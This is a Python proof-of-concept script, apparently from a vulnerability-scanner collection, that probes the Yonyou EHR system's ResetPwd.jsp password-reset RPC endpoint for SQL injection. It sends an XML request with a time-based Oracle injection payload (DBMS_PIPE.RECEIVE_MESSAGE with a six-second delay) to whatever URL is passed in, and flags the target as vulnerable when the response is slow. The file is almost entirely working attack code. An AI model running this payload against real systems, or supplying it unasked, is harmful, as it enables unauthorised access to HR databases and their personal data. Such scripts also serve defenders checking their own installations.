#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: 用友EHR系统 ResetPwd.jsp SQL注入
referer: http://www.wooyun.org/bugs/wooyun-2014-68060
author: Lucifer
description: 用友EHR系统找回密码处存在XMLtype类型注入。
'''
import sys
import time
import json
import requests
import warnings
def run(url):
        result = ['用友EHR系统 ResetPwd.jsp SQL注入','','']
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        payload = "/hrss/dorado/smartweb2.RPC.d?__rpc=true"
        post_data = {
            "__type":"updateData",
            "__viewInstanceId":"nc.bs.hrss.rm.ResetPassword~nc.bs.hrss.rm.ResetPasswordViewModel",
            "__xml":'''<rpc method="resetPwd" transaction="10"><def><dataset id="dsResetPwd" type="Custom"><f name="user"></f></dataset></def><data><rs dataset="dsResetPwd"><r state="insert" id="10008"><n><v>aaa'AnD 4821=DBMS_PIPE.RECEIVE_MESSAGE(CHR(73)||CHR(65)||CHR(122)||CHR(82),6)AnD'kOkV'='kOkV</v></n></r></rs></data><vps><p type="0" name="__profileKeys">findPwd%3B9589d8b622333776899b3ff0567f4603</p></vps></rpc>''', 
            "1480658911300":""
        }
        vulnurl = url + payload
        start_time = time.time()
        try:
            req = requests.post(vulnurl, data=post_data, headers=headers, timeout=10, verify=False)
            if time.time() - start_time >= 6:
                result[2]=  '存在'
                result[1]=vulnurl+"\npost: "+json.dumps(post_data, indent=4)

            else:
                result[2]=  '不存在'

        except:
            result[2]='不存在'
        return result

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = run(sys.argv[1])
    